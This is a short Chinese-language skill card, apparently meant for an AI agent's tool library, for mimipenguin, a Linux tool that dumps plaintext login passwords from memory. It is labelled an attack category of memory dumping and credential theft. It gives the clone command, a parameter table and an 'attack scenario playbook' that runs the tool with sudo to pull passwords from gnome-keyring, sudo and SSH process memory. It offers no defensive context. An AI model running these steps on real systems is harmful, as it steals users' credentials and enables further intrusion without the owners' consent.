---
name: mimipenguin-linux
description: mimipenguin: Linux 内存明文密码提取。信号:内存转储,lsass,Python 版,详细。
---

# mimipenguin

- 攻击大类:C24 内存转储与LSASS窃取
- 上游仓库:https://github.com/huntergregal/mimipenguin
- 上游 License:NOASSERTION(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/huntergregal/mimipenguin && cd mimipenguin
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./mimipenguin.sh` | Dump 登录密码(需 root) |
| `./mimipenguin.py` | Python 版 |
| `-v` | 详细 |

## 攻击场景 Playbook

### Linux 内存明文密码提取

```bash
sudo ./mimipenguin.sh  # 从 gnome-keyring/sudo/ssh 进程内存提取明文
```

## 注意事项

Linux 版 mimikatz;GNOME 桌面/SSH agent 内存里常能抠出明文口令。
